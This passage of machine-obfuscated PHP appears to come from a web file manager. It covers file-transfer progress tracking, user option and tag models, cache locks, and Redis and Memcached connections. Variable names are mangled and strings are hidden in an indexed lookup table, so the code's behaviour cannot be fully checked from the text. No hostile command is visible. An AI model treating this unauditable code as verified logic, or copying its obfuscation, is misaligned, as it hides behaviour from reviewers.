$Ç»ğ½ïè[33] => $Ç»ğ½ïè[1163]))->delete(); } $ŒÚ¬äåÑ = json_encode($Á×™†Ÿ†); if (!$ŒÚ¬äåÑ) { ob_start(); var_dump($Á×™†Ÿ†); $¶µ€üöæ = ob_get_clean(); self::log($Ç»ğ½ïè[1808] . json_encode_force($¶µ€üöæ)); } if (!$´º…å¦„ || !$Á×™†Ÿ†[$Ç»ğ½ïè[475]]) { return !1; } $à²é£±ü = array($Ç»ğ½ïè[33] => $Ç»ğ½ïè[1163], $Ç»ğ½ïè[1781] => USER_ID, $Ç»ğ½ïè[97] => $´º…å¦„, $Ç»ğ½ïè[450] => $ŒÚ¬äåÑ); $íƒ¯ê³¡ = $Ç»ğ½ïè[1809]; CacheLock::lock($íƒ¯ê³¡); Model($Ç»ğ½ïè[520])->add($à²é£±ü, array(), !0); CacheLock::unlock($íƒ¯ê³¡); } public static function log($ˆÆñšŒ×) { if (!GLOBAL_DEBUG) { return; } write_log($ˆÆñšŒ×, $_SERVER[Ùæõ‰Ï’][1810]); } } class TaskFileTransfer extends Task { protected function startAfter() { $…Ò¢ŒÕÇ =& $_SERVER[Ùæõ‰Ï’]; $äº»ëª =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($…Ò¢ŒÕÇ[1811], array($this, $…Ò¢ŒÕÇ[1812])); Hook::bind($…Ò¢ŒÕÇ[1321], array($this, $…Ò¢ŒÕÇ[1813])); Hook::bind($…Ò¢ŒÕÇ[1814], array($this, $…Ò¢ŒÕÇ[1815])); Hook::bind($…Ò¢ŒÕÇ[668], array($this, $…Ò¢ŒÕÇ[1816])); Hook::bind($…Ò¢ŒÕÇ[669], array($this, $…Ò¢ŒÕÇ[1817])); Hook::bind($…Ò¢ŒÕÇ[675], array($this, $…Ò¢ŒÕÇ[1818])); Hook::bind($…Ò¢ŒÕÇ[676], array($this, $…Ò¢ŒÕÇ[1819])); Hook::bind($…Ò¢ŒÕÇ[671], array($this, $…Ò¢ŒÕÇ[1820])); Hook::bind($…Ò¢ŒÕÇ[673], array($this, $…Ò¢ŒÕÇ[1821])); Hook::bind($…Ò¢ŒÕÇ[637], array($this, $…Ò¢ŒÕÇ[1822])); Hook::bind($…Ò¢ŒÕÇ[634], array($this, $…Ò¢ŒÕÇ[1822])); Hook::bind($…Ò¢ŒÕÇ[639], array($this, $…Ò¢ŒÕÇ[1822])); Hook::bind($…Ò¢ŒÕÇ[641], array($this, $…Ò¢ŒÕÇ[1822])); Hook::bind($…Ò¢ŒÕÇ[643], array($this, $…Ò¢ŒÕÇ[1822])); Hook::bind($…Ò¢ŒÕÇ[1823], array($this, $…Ò¢ŒÕÇ[1824])); Hook::bind($…Ò¢ŒÕÇ[659], array($this, $…Ò¢ŒÕÇ[1825])); $this->sourceModelCopyFlag = !1; Hook::bind($…Ò¢ŒÕÇ[1826], array($this, $…Ò¢ŒÕÇ[1827])); Hook::bind($…Ò¢ŒÕÇ[1828], array($this, $…Ò¢ŒÕÇ[1829])); Hook::bind($…Ò¢ŒÕÇ[1830], array($this, $…Ò¢ŒÕÇ[1831])); $äº»ëª[$…Ò¢ŒÕÇ[1832]] = LNG($…Ò¢ŒÕÇ[1833]); $äº»ëª[$…Ò¢ŒÕÇ[1834]] = 0; $äº»ëª[$…Ò¢ŒÕÇ[1835]] = 0; $äº»ëª[$…Ò¢ŒÕÇ[1156]] = $…Ò¢ŒÕÇ[12]; $äº»ëª[$…Ò¢ŒÕÇ[1836]] = $…Ò¢ŒÕÇ[12]; $äº»ëª[$…Ò¢ŒÕÇ[1837]] = 0; $äº»ëª[$…Ò¢ŒÕÇ[1838]] = 0; $äº»ëª[$…Ò¢ŒÕÇ[1839]] = 0; if (!$äº»ëª[$…Ò¢ŒÕÇ[1670]]) { $äº»ëª[$…Ò¢ŒÕÇ[1670]] = LNG($…Ò¢ŒÕÇ[1840]); } } protected function endAfter() { $ëŒûàÃ =& $_SERVER[Ùæõ‰Ï’]; Hook::unbind($ëŒûàÃ[1811], array($this, $ëŒûàÃ[1812])); Hook::unbind($ëŒûàÃ[1321], array($this, $ëŒûàÃ[1813])); Hook::unbind($ëŒûàÃ[1814], array($this, $ëŒûàÃ[1815])); Hook::unbind($ëŒûàÃ[668], array($this, $ëŒûàÃ[1816])); Hook::unbind($ëŒûàÃ[669], array($this, $ëŒûàÃ[1817])); Hook::unbind($ëŒûàÃ[675], array($this, $ëŒûàÃ[1818])); Hook::unbind($ëŒûàÃ[676], array($this, $ëŒûàÃ[1819])); Hook::unbind($ëŒûàÃ[671], array($this, $ëŒûàÃ[1820])); Hook::unbind($ëŒûàÃ[673], array($this, $ëŒûàÃ[1821])); Hook::unbind($ëŒûàÃ[637], array($this, $ëŒûàÃ[1822])); Hook::unbind($ëŒûàÃ[634], array($this, $ëŒûàÃ[1822])); Hook::unbind($ëŒûàÃ[639], array($this, $ëŒûàÃ[1822])); Hook::unbind($ëŒûàÃ[641], array($this, $ëŒûàÃ[1822])); Hook::unbind($ëŒûàÃ[643], array($this, $ëŒûàÃ[1822])); Hook::unbind($ëŒûàÃ[1823], array($this, $ëŒûàÃ[1824])); Hook::unbind($ëŒûàÃ[659], array($this, $ëŒûàÃ[1825])); Hook::unbind($ëŒûàÃ[1826], array($this, $ëŒûàÃ[1827])); Hook::unbind($ëŒûàÃ[1828], array($this, $ëŒûàÃ[1829])); Hook::unbind($ëŒûàÃ[1830], array($this, $ëŒûàÃ[1831])); } public function copyMoveStart($ôĞá×€”, $  ‹”¶ı, $Ììšû¡õ, $÷çø¼Çö) { $Ô±¿çµ‘ =& $_SERVER[Ùæõ‰Ï’]; self::log($Ô±¿çµ‘[1841] . $  ‹”¶ı . $Ô±¿çµ‘[73] . $÷çø¼Çö); $öô¶¼÷¿ = rtrim(TEMP_FILES, $Ô±¿çµ‘[8]); if (substr($  ‹”¶ı, 0, strlen($öô¶¼÷¿)) == $öô¶¼÷¿) { return; } if (substr($÷çø¼Çö, 0, strlen($öô¶¼÷¿)) == $öô¶¼÷¿) { return; } $İÓÅó„ó =& $this->task; $İÓÅó„ó[$Ô±¿çµ‘[1842]] = KodIO::transferType($ôĞá×€”, $Ììšû¡õ); $this->update(); } public function updateAfter() { $¦²—’¶¦ =& $_SERVER[Ùæõ‰Ï’]; $Ù·Ã„Ş¦ =& $this->task; if (!$Ù·Ã„Ş¦[$¦²—’¶¦[846]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($Ù·Ã„Ş¦[$¦²—’¶¦[1842]] == $¦²—’¶¦[1414]) { return; } self::updateTask($Ù·Ã„Ş¦); } private static function updateTask(&$÷×¢ú¢Â) { $åÖšêÙÈ =& $_SERVER[Ùæõ‰Ï’]; if ($÷×¢ú¢Â[$åÖšêÙÈ[1842]] == $åÖšêÙÈ[1292] || $÷×¢ú¢Â[$åÖšêÙÈ[1842]] == $åÖšêÙÈ[110]) { if ($÷×¢ú¢Â[$åÖšêÙÈ[1836]]) { $÷×¢ú¢Â[$åÖšêÙÈ[1839]] = $÷×¢ú¢Â[$åÖšêÙÈ[1838]] + $÷×¢ú¢Â[$åÖšêÙÈ[1835]]; } } else { if ($÷×¢ú¢Â[$åÖšêÙÈ[1842]] == $åÖšêÙÈ[1415]) { if ($÷×¢ú¢Â[$åÖšêÙÈ[1836]] == $åÖšêÙÈ[1292]) { $÷×¢ú¢Â[$åÖšêÙÈ[1839]] = $÷×¢ú¢Â[$åÖšêÙÈ[1838]] + $÷×¢ú¢Â[$åÖšêÙÈ[1835]] * 0.5; } else { if ($÷×¢ú¢Â[$åÖšêÙÈ[1836]] == $åÖšêÙÈ[110]) { $÷×¢ú¢Â[$åÖšêÙÈ[1839]] = $÷×¢ú¢Â[$åÖšêÙÈ[1838]] + $÷×¢ú¢Â[$åÖšêÙÈ[1834]] * 0.5 + $÷×¢ú¢Â[$åÖšêÙÈ[1835]] * 0.5; } } } } $÷×¢ú¢Â[$åÖšêÙÈ[1783]] = $÷×¢ú¢Â[$åÖšêÙÈ[1839]] / $÷×¢ú¢Â[$åÖšêÙÈ[846]]; if ($÷×¢ú¢Â[$åÖšêÙÈ[1783]] > 0) { $¬«ËÍ²ò = timeFloat() - $÷×¢ú¢Â[$åÖšêÙÈ[1785]] - $÷×¢ú¢Â[$åÖšêÙÈ[1788]]; $÷×¢ú¢Â[$åÖšêÙÈ[1789]] = $¬«ËÍ²ò * (1 - $÷×¢ú¢Â[$åÖšêÙÈ[1783]]) / $÷×¢ú¢Â[$åÖšêÙÈ[1783]]; } } public function addPath($¶æ•í¢) { $µÁíÚë =& $_SERVER[Ùæõ‰Ï’]; if (!$¶æ•í¢) { return; } $¬á§ÛÙê =& $this->task; $ú¥ö–°ş = IO::infoWithChildren($¶æ•í¢); $º¸ Èäå = $¬á§ÛÙê[$µÁíÚë[1843]] ? $¬á§ÛÙê[$µÁíÚë[1843]][$µÁíÚë[1844]] : 0; $¬á§ÛÙê[$µÁíÚë[1843]] = array($µÁíÚë[1844] => $º¸ Èäå + 1, $µÁíÚë[494] => $ú¥ö–°ş[$µÁíÚë[32]], $µÁíÚë[87] => $ú¥ö–°ş[$µÁíÚë[87]], $µÁíÚë[582] => $ú¥ö–°ş[$µÁíÚë[582]] ? $ú¥ö–°ş[$µÁíÚë[582]] : $ú¥ö–°ş[$µÁíÚë[87]]); if ($ú¥ö–°ş[$µÁíÚë[33]] == $µÁíÚë[230]) { $¬á§ÛÙê[$µÁíÚë[1154]] += 1; } else { $¬á§ÛÙê[$µÁíÚë[1154]] += $ú¥ö–°ş[$µÁíÚë[82]][$µÁíÚë[80]]; if ($ú¥ö–°ş[$µÁíÚë[193]]) { $¬á§ÛÙê[$µÁíÚë[1154]] += $ú¥ö–°ş[$µÁíÚë[82]][$µÁíÚë[81]] + 1; } } $¬á§ÛÙê[$µÁíÚë[846]] += $ú¥ö–°ş[$µÁíÚë[79]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($¤ë¦ªï±) { } public function sourceAddHashEnd($ÇçŠÎ´‚) { } public function sourceAddFileStart($Ùå¡÷ÜÆ) { $º‚åß’À =& $_SERVER[Ùæõ‰Ï’]; $ª¦™Ñç× =& $this->task; $ª¦™Ñç×[$º‚åß’À[1834]] = $Ùå¡÷ÜÆ[$º‚åß’À[79]]; $ª¦™Ñç×[$º‚åß’À[1832]] = $Ùå¡÷ÜÆ[$º‚åß’À[32]]; $ª¦™Ñç×[$º‚åß’À[1156]] = $Ùå¡÷ÜÆ[$º‚åß’À[32]]; $ª¦™Ñç×[$º‚åß’À[1845]] = $Ùå¡÷ÜÆ[$º‚åß’À[87]]; $this->update(); } public function sourceAddFileEnd($Îğ‚¢®Ê) { $Ğ’ãÌÅ =& $_SERVER[Ùæõ‰Ï’]; $Ÿ±È×Á“ =& $this->task; $Ÿ±È×Á“[$Ğ’ãÌÅ[1839]] += $Îğ‚¢®Ê[$Ğ’ãÌÅ[79]]; $Ÿ±È×Á“[$Ğ’ãÌÅ[1845]] = $Îğ‚¢®Ê[$Ğ’ãÌÅ[87]]; $this->update(1); } public function copyFileStart($ÁÕ€É €, $òè¼ø÷Ê, $ÈÙæšÕ‹, $·Ë¥‚Šì, $øêó¿, $Ê¡é»Ä) { $™¶šÁÄ“ =& $_SERVER[Ùæõ‰Ï’]; $‰Ù»ëÏƒ = $øêó¿; if ($‰Ù»ëÏƒ == $GLOBALS[$™¶šÁÄ“[1846]]) { $‰Ù»ëÏƒ = $GLOBALS[$™¶šÁÄ“[1847]]; } $GLOBALS[$™¶šÁÄ“[1847]] = $øêó¿; $GLOBALS[$™¶šÁÄ“[1846]] = $Ê¡é»Ä; $­·ôÁõü =& $this->task; $­·ôÁõü[$™¶šÁÄ“[1832]] = $‰Ù»ëÏƒ; $­·ôÁõü[$™¶šÁÄ“[1834]] = (int) $ÁÕ€É €->size($òè¼ø÷Ê); $­·ôÁõü[$™¶šÁÄ“[1835]] = 0; $­·ôÁõü[$™¶šÁÄ“[1156]] = $™¶šÁÄ“[12]; $­·ôÁõü[$™¶šÁÄ“[1836]] = $™¶šÁÄ“[12]; $­·ôÁõü[$™¶šÁÄ“[1837]] = 0; $ŒŒ¶·› = $­·ôÁõü[$™¶šÁÄ“[1834]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($­·ôÁõü[$™¶šÁÄ“[475]] . $™¶šÁÄ“[1848]); if ($ŒŒ¶·› && file_exists(get_path_father($·Ë¥‚Šì))) { Cache::set($­·ôÁõü[$™¶šÁÄ“[475]] . $™¶šÁÄ“[1848], $·Ë¥‚Šì); $­·ôÁõü[$™¶šÁÄ“[1805]] = array($™¶šÁÄ“[1849], $™¶šÁÄ“[1850]); } $this->update(0, $ŒŒ¶·›); } public static function updateCopyLocalFileSize($·‡ Ğ¤š) { $Ç§Àà¥¤ =& $_SERVER[Ùæõ‰Ï’]; $ûªà¤Ã = Cache::get($·‡ Ğ¤š[$Ç§Àà¥¤[475]] . $Ç§Àà¥¤[1848]); if (!$ûªà¤Ã || !file_exists($ûªà¤Ã)) { return $·‡ Ğ¤š; } $·‡ Ğ¤š[$Ç§Àà¥¤[1835]] = @filesize($ûªà¤Ã); $·‡ Ğ¤š[$Ç§Àà¥¤[1839]] += $·‡ Ğ¤š[$Ç§Àà¥¤[1835]]; self::updateTask($·‡ Ğ¤š); return $·‡ Ğ¤š; } public function copyFileEnd($™¾æ†û‰, $”¬£ä¤¨, $Å¿ŒÉå¿, $µ€ÅÂ‘ô, $Ú¼÷Şú°, $ÌĞİğé) { $Ğæ¶•Ø =& $_SERVER[Ùæõ‰Ï’]; $øØºÙ×ö =& $this->task; $øØºÙ×ö[$Ğæ¶•Ø[1835]] = $øØºÙ×ö[$Ğæ¶•Ø[1834]]; $øØºÙ×ö[$Ğæ¶•Ø[1836]] = $Ğæ¶•Ø[12]; unset($øØºÙ×ö[$Ğæ¶•Ø[1805]]); if ($Ú¼÷Şú° == $øØºÙ×ö[$Ğæ¶•Ø[1832]]) { $øØºÙ×ö[$Ğæ¶•Ø[1838]] += $øØºÙ×ö[$Ğæ¶•Ø[1834]]; $øØºÙ×ö[$Ğæ¶•Ø[1839]] = $øØºÙ×ö[$Ğæ¶•Ø[1838]]; $Ë¦¹—ùã = 1; if (isset($øØºÙ×ö[$Ğæ¶•Ø[1845]]) && $øØºÙ×ö[$Ğæ¶•Ø[1845]] == $”¬£ä¤¨) { $Ë¦¹—ùã = 0; } $this->update($Ë¦¹—ùã); } else { $this->update(); $øØºÙ×ö[$Ğæ¶•Ø[1835]] = 0; } Cache::remove($øØºÙ×ö[$Ğæ¶•Ø[475]] . $Ğæ¶•Ø[1848]); self::log($Ğæ¶•Ø[1851] . $”¬£ä¤¨ . $Ğæ¶•Ø[73] . $µ€ÅÂ‘ô . $Ğæ¶•Ø[262] . $Ú¼÷Şú° . $Ğæ¶•Ø[1852] . $øØºÙ×ö[$Ğæ¶•Ø[1832]]); } public function updateFileEnd($Õ«‡ÅÑô, $î§Šæéï) { $ä˜ĞÈı =& $_SERVER[Ùæõ‰Ï’]; $Şõ¹÷Ã¶ =& $this->task; $Şõ¹÷Ã¶[$ä˜ĞÈı[1832]] = $Õ«‡ÅÑô; $Şõ¹÷Ã¶[$ä˜ĞÈı[1834]] = $î§Šæéï; $Şõ¹÷Ã¶[$ä˜ĞÈı[1838]] += $î§Šæéï; $Şõ¹÷Ã¶[$ä˜ĞÈı[1839]] = $Şõ¹÷Ã¶[$ä˜ĞÈı[1838]]; $this->update(1); self::log($ä˜ĞÈı[1853] . $Õ«‡ÅÑô); } public function sourceModelCopy($Ãê¦¿Àº) { $ï‘Ô„ =& $_SERVER[Ùæõ‰Ï’]; $®ôÚ…¾Ù = $Ãê¦¿Àº[0]; $Ş®³í¾Í = $Ãê¦¿Àº[1]; $«¿¾Àıù =& $this->task; $this->sourceModelCopyFlag = !0; $—¬ÀÒê = 0; switch ($®ôÚ…¾Ù) { case $ï‘Ô„[635]: $—¬ÀÒê = 1; break; case $ï‘Ô„[638]: $«¿¾Àıù[$ï‘Ô„[1832]] = $Ş®³í¾Í[$ï‘Ô„[32]]; break; case $ï‘Ô„[640]: $—¬ÀÒê = intval($Ãê¦¿Àº[$ï‘Ô„[456]] * 0.4); break; case $ï‘Ô„[642]: $—¬ÀÒê = intval($Ãê¦¿Àº[$ï‘Ô„[456]] * 0.2); break; case $ï‘Ô„[644]: $—¬ÀÒê = intval($Ãê¦¿Àº[$ï‘Ô„[456]] * 0.4); break; } $this->update($—¬ÀÒê); $this->sourceModelCopyFlag = !1; } public function sourceRemove($à‰©òŒü, $™¡È¾‘’) { $·ë”Ù¶í =& $_SERVER[Ùæõ‰Ï’]; $this->sourceModelCopyFlag = !0; $¥’®Ûä = 1; if (isset($à‰©òŒü[$·ë”Ù¶í[82]])) { $¥’®Ûä = $à‰©òŒü[$·ë”Ù¶í[82]][$·ë”Ù¶í[80]]; $¥’®Ûä = $¥’®Ûä + $à‰©òŒü[$·ë”Ù¶í[82]][$·ë”Ù¶í[81]] + 1; } $this->update($¥’®Ûä); $this->sourceModelCopyFlag = !1; } public function sourceMove($€ìÅ´İ) { $this->sourceRemove($€ìÅ´İ, !1); } public function curlProgress($Çï±„‹À, $¢Ñ­å†Ø, $†ÆÉ˜¡Ñ, $Äñ¼ğ¬, $¿ıÚ™Õ¤) { $™±Ú =& $_SERVER[Ùæõ‰Ï’]; $èÑ‹ëŠ  =& $this->task; if ($¿ıÚ™Õ¤ > 0) { $èÑ‹ëŠ [$™±Ú[1156]] = $™±Ú[1854]; $èÑ‹ëŠ [$™±Ú[1836]] = $™±Ú[110]; if ($èÑ‹ëŠ [$™±Ú[1834]]) { $èÑ‹ëŠ [$™±Ú[1835]] = $¿ıÚ™Õ¤; } if ($èÑ‹ëŠ [$™±Ú[1837]]) { $èÑ‹ëŠ [$™±Ú[1835]] = $¿ıÚ™Õ¤ + $èÑ‹ëŠ [$™±Ú[1837]]; } } else { if ($†ÆÉ˜¡Ñ > 0) { if ($èÑ‹ëŠ [$™±Ú[1834]] == $¢Ñ­å†Ø) { $èÑ‹ëŠ [$™±Ú[1835]] = $†ÆÉ˜¡Ñ; $èÑ‹ëŠ [$™±Ú[1156]] = $™±Ú[1855]; $èÑ‹ëŠ [$™±Ú[1836]] = $™±Ú[1292]; } } } $this->update(); } public function curlProgressStart($Ìäå²ûø) { } public function curlProgressEnd($Ş¯ñ†Ÿ) { $£¸”å˜è =& $_SERVER[Ùæõ‰Ï’]; $‚øµ¤ÊØ =& $this->task; $É¿ªäó“ = curl_getinfo($Ş¯ñ†Ÿ); $± Ññ  = $É¿ªäó“[$£¸”å˜è[1856]]; if ($± Ññ  == -1) { $± Ññ  = $É¿ªäó“[$£¸”å˜è[1857]]; } if ($‚øµ¤ÊØ[$£¸”å˜è[1836]] == $£¸”å˜è[110] && $± Ññ ) { $‚øµ¤ÊØ[$£¸”å˜è[1837]] += $± Ññ ; } $this->update(); } } goto E±Í‰í˜¤Ñ; EÑ‘³œËË: class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\x73\145\162\x5f\x6f\x70\x74\151\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($Ñ¥ø»°ë) { $¸ÇÔÊÒÊ =& $_SERVER[Ùæõ‰Ï’]; $Õ”Ó¬úÎ = defined($¸ÇÔÊÒÊ[2205]) && USER_ID ? USER_ID : $¸ÇÔÊÒÊ[12]; return "\x55\163\x65\162\117\160\164\151\x6f\x6e\137{$Ñ¥ø»°ë}\137" . $Õ”Ó¬úÎ; } protected function filterWhere($Ú¹Ãæ) { $Æğç²å• =& $_SERVER[Ùæõ‰Ï’]; $Ú¹Ãæ[$Æğç²å•[1781]] = defined($Æğç²å•[2205]) && USER_ID ? USER_ID : $Æğç²å•[12]; return $Ú¹Ãæ; } public function cacheRemoveUser($”Ù‡ÓÈÇ, $¥ £¾š) { return Cache::remove("\x55\x73\145\x72\117\x70\164\x69\x6f\x6e\x5f{$”Ù‡ÓÈÇ}\x5f" . $¥ £¾š); } protected function optionDefault($¡ˆëÉ˜ó = '') { $Ç±†óê =& $_SERVER[Ùæõ‰Ï’]; if ($¡ˆëÉ˜ó == $Ç±†óê[12]) { return $GLOBALS[$Ç±†óê[6]][$Ç±†óê[2506]]; } if ($¡ˆëÉ˜ó == $Ç±†óê[2507]) { return $GLOBALS[$Ç±†óê[6]][$Ç±†óê[2508]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\163\145\162\56\x74\x61\x67\x4c\151\x73\x74"; public $modelType = "\125\163\x65\x72\117\160\x74\151\x6f\x6e"; public $field = array("\x6e\x61\155\145", "\163\x74\171\x6c\x65", "\x73\x6f\x72\x74"); public function listData($ÒĞóÁªü = false, $ç­ñ€Œ = "\x73\157\162\x74", $à‚é›È‹ = false) { return parent::listData($ÒĞóÁªü, $ç­ñ€Œ, $à‚é›È‹); } public function remove($€ğ†¯Á) { return parent::remove($€ğ†¯Á); } public function add($µ‚ïÈôÃ, $ˆåÍß‘ = "\x6c\141\142\145\x6c\x2d\147\x72\x65\171\55\x6e\157\162\155\141\154") { $…¤Æ¹ë =& $_SERVER[Ùæõ‰Ï’]; if ($this->findByName($µ‚ïÈôÃ)) { return !1; } $ØçŸÅÊ¶ = array($…¤Æ¹ë[494] => $µ‚ïÈôÃ, $…¤Æ¹ë[558] => $ˆåÍß‘, $…¤Æ¹ë[1983] => $this->getSort($…¤Æ¹ë[335]) + 1); return parent::insert($ØçŸÅÊ¶); } public function update($ÈÂ‡ìÆÒ, $×ú…–ì) { $ŠÙ¼±ô‹ =& $_SERVER[Ùæõ‰Ï’]; $®±À¸€¹ = $this->listData($ÈÂ‡ìÆÒ); $÷³”Ÿª = $this->findByName($×ú…–ì[$ŠÙ¼±ô‹[32]]); if (!$®±À¸€¹ || $÷³”Ÿª && $÷³”Ÿª[$ŠÙ¼±ô‹[475]] != $®±À¸€¹[$ŠÙ¼±ô‹[475]]) { return !1; } return parent::update($ÈÂ‡ìÆÒ, $×ú…–ì); } public function moveTop($ìÛë¤§) { $Ñ’ö¢¯ =& $_SERVER[Ùæõ‰Ï’]; $ùËåµÜš = parent::listData(); $€€¹ã½½ = $this->getSort($Ñ’ö¢¯[334]); foreach ($ùËåµÜš as &$ÏåíŸá‡) { if ($ÏåíŸá‡[$Ñ’ö¢¯[475]] == $ìÛë¤§) { $ÏåíŸá‡[$Ñ’ö¢¯[2003]] = $€€¹ã½½; continue; } $ÏåíŸá‡[$Ñ’ö¢¯[2003]] += 1; } unset($ÏåíŸá‡); return parent::resetData($ùËåµÜš); } public function moveBottom($ö²ÑÁ‘Ü) { $‚ÖüÖçÁ =& $_SERVER[Ùæõ‰Ï’]; $¾ñòïŞ = $this->getSort($‚ÖüÖçÁ[335]) + 1; return parent::update($ö²ÑÁ‘Ü, array($‚ÖüÖçÁ[2003] => $¾ñòïŞ)); } public function resetSort($´®üšä) { $ïã€ÔøŒ =& $_SERVER[Ùæõ‰Ï’]; $™¤Îı­Ç = array(); $´®üšä = is_array($´®üšä) ? $´®üšä : array(); for ($çÇÓ‹ÖÃ = 0; $çÇÓ‹ÖÃ < count($´®üšä); $çÇÓ‹ÖÃ++) { $™¤Îı­Ç[$´®üšä[$çÇÓ‹ÖÃ] . $ïã€ÔøŒ[12]] = $çÇÓ‹ÖÃ + 1; } $úƒáˆ = parent::listData(); foreach ($úƒáˆ as &$“ô‹²éò) { $»ù•‚Æñ = $™¤Îı­Ç[$“ô‹²éò[$ïã€ÔøŒ[475]]]; $“ô‹²éò[$ïã€ÔøŒ[2003]] = $»ù•‚Æñ ? $»ù•‚Æñ : $“ô‹²éò[$ïã€ÔøŒ[2003]]; } unset($“ô‹²éò); return parent::resetData($úƒáˆ); } private function getSort($ƒ„¹Âûò) { $¹Î”©¢„ =& $_SERVER[Ùæõ‰Ï’]; $é†ÙŞœ = parent::listData(); $ÓÀ´çÑ­ = array_to_keyvalue($é†ÙŞœ, $¹Î”©¢„[12], $¹Î”©¢„[2003]); if (!$ÓÀ´çÑ­) { $ÓÀ´çÑ­ = array(0); } $»ï¼¶Î» = $ƒ„¹Âûò == $¹Î”©¢„[335] ? max($ÓÀ´çÑ­) : min($ÓÀ´çÑ­); return intval($»ï¼¶Î»); } } goto dëÈäÎÓÜ; C°ã‘›Íª´: class CacheLockDatabase { public function lock($ÀÔº©éå, $ÍÊ‹ØÏ = 0) { $¹®„Ç¦ = Model($_SERVER[Ùæõ‰Ï’][911]); $Ÿº¥ëˆÂ = microtime(!0) + $ÍÊ‹ØÏ; while (microtime(!0) < $Ÿº¥ëˆÂ) { $ÍéÎµ¡õ = $¹®„Ç¦->get($ÀÔº©éå); if (!$ÍéÎµ¡õ || $ÍéÎµ¡õ < microtime(!0)) { $âçÓáõ¶ = $¹®„Ç¦->set($ÀÔº©éå, $Ÿº¥ëˆÂ); if ($âçÓáõ¶) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($şÑüˆ«Ã) { return Model($_SERVER[Ùæõ‰Ï’][911])->get($şÑüˆ«Ã); } public function unlock($…Šíä¦µ) { Model($_SERVER[Ùæõ‰Ï’][911])->remove($…Šíä¦µ); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($€Öãß“, $Œõ÷İ—‘) { $§É—¤Æ =& $_SERVER[Ùæõ‰Ï’]; if (!class_exists($§É—¤Æ[949])) { show_json($§É—¤Æ[950], !1); } $this->cacheTime = $Œõ÷İ—‘; $this->handle = new Memcached(); if (is_array($€Öãß“[$§É—¤Æ[951]]) && count($€Öãß“[$§É—¤Æ[951]]) >= 1) { foreach ($€Öãß“[$§É—¤Æ[951]] as $•ùö‘ŸÓ) { $˜®êÇÓØ = explode($§É—¤Æ[4], $•ùö‘ŸÓ); $this->handle->addServer($˜®êÇÓØ[0], $˜®êÇÓØ[1]); } } else { $this->handle->addServer($€Öãß“[$§É—¤Æ[208]], $€Öãß“[$§É—¤Æ[209]]); } } public function set($İÕĞ§Ç, $¹­™ˆ‹», $›‘÷å¶ = false) { $›‘÷å¶ = $›‘÷å¶ ? $›‘÷å¶ : $this->cacheTime; return $this->handle->set($İÕĞ§Ç, $¹­™ˆ‹», $›‘÷å¶); } public function get($Á‚Ìëµ—) { return $this->handle->get($Á‚Ìëµ—); } public function remove($Ö—²«®) { return $this->handle->delete($Ö—²«®); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($½…ßÂ­¤, $¥Ä¯’Ë¹) { $™°¤‘Óî =& $_SERVER[Ùæõ‰Ï’]; if (!class_exists($™°¤‘Óî[952])) { show_json($™°¤‘Óî[953], !1); } $this->cacheTime = $¥Ä¯’Ë¹; $ßŸ§¥Í’ = isset($½…ßÂ­¤[$™°¤‘Óî[954]]) ? $½…ßÂ­¤[$™°¤‘Óî[954]] : 10; $êŒ¬ µÈ = _get($½…ßÂ­¤, $™°¤‘Óî[951]); if ($êŒ¬ µÈ && is_array($êŒ¬ µÈ)) { $this->initCluster($½…ßÂ­¤, $ßŸ§¥Í’); } else { $this->handle = $this->init($½…ßÂ­¤, $ßŸ§¥Í’); } } private function init($õÛ¶Æ™¶, $—ò±è·†) { $Ÿ¸š¢Èİ =& $_SERVER[Ùæõ‰Ï’]; $¡¡‘¾Í = new Redis(); $âÔ¯–ò = isset($õÛ¶Æ™¶[$Ÿ¸š¢Èİ[955]]) ? $õÛ¶Æ™¶[$Ÿ¸š¢Èİ[955]] : !1; if ($âÔ¯–ò) { $¡¡‘¾Í->pconnect($õÛ¶Æ™¶[$Ÿ¸š¢Èİ[208]], $õÛ¶Æ™¶[$Ÿ¸š¢Èİ[209]], $—ò±è·†); } else { $¡¡‘¾Í->connect($õÛ¶Æ™¶[$Ÿ¸š¢Èİ[208]], $õÛ¶Æ™¶[$Ÿ¸š¢Èİ[209]], $—ò±è·†); } if (!empty($õÛ¶Æ™¶[$Ÿ¸š¢Èİ[487]])) { $¡¡‘¾Í->auth($õÛ¶Æ™¶[$Ÿ¸š¢Èİ[487]]); } if (!empty($õÛ¶Æ™¶[$Ÿ¸š¢Èİ[840]]) && $õÛ¶Æ™¶[$Ÿ¸š¢Èİ[840]] != 0) { $¡¡‘¾Í->select($õÛ¶Æ™¶[$Ÿ¸š¢Èİ[840]]); } return $¡¡‘¾Í; } private function initCluster($¡…Í¯µç, $ñ’’Å) { $é†üÃÈı =& $_SERVER[Ùæõ‰Ï’]; $½’°À€´ = array($é†üÃÈı[956], $é†üÃÈı[957], $é†üÃÈı[958]); $…ÕÅÂÈÅ = $é†üÃÈı[956]; if (isset($¡…Í¯µç[$é†üÃÈı[16]]) && in_array($¡…Í¯µç[$é†üÃÈı[16]], $½’°À€´)) { $…ÕÅÂÈÅ = $¡…Í¯µç[$é†üÃÈı[16]]; } switch ($…ÕÅÂÈÅ) { case $é†üÃÈı[956]: $this->_slave($¡…Í¯µç, $ñ’’Å); break; case $é†üÃÈı[957]: break; case $é†üÃÈı[958]: $this->isCluster = !0; $ˆæùğõ• = $¡…Í¯µç[$é†üÃÈı[951]]; $›³ˆÕ×ª = isset($¡…Í¯µç[$é†üÃÈı[955]]) ? $¡…Í¯µç[$é†üÃÈı[955]] : !1; $†Ç¦ŒáÙ = isset($¡…Í¯µç[$é†üÃÈı[487]]) ? $¡…Í¯µç[$é†üÃÈı[487]] : null; $this->handle = new RedisCluster(NUll, $ˆæùğõ•, $ñ’’Å, $ñ’’Å, $›³ˆÕ×ª, $†Ç¦ŒáÙ); break; default: break; } } private function _slave($é×·÷ , $åà••Ë¼) { $ÄåÈöÖË = $é×·÷ 